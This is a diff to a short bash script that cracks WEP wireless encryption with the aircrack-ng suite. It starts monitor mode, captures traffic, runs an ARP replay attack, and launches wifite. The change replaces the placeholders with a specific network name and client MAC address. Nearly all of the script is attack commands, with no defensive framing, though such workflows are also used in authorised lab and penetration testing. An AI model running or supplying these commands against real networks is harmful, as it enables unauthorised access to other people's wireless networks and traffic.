@@ -1,16 +1,16 @@
 #!/bin/bash
 
-# Scan the airwaves
+## Scan the airwaves
 service network-manager stop
 airmon-ng start wlan0
 airodump-ng mon0
 
-# Crack using ARP replay
-aireplay-ng --arpreplay -e <ESSID> -h <Test Client> mon0
+## Crack using ARP replay
+aireplay-ng --arpreplay -e wirelessdont -h EC:88:92:79:FB:0E mon0
 
-# All-in-one
+## Point and shoot WEP cracking tool
 /usr/bin/wifite
 
-# Cleanup
+## Cleanup
 airmon-ng stop mon0
 service network-manager start
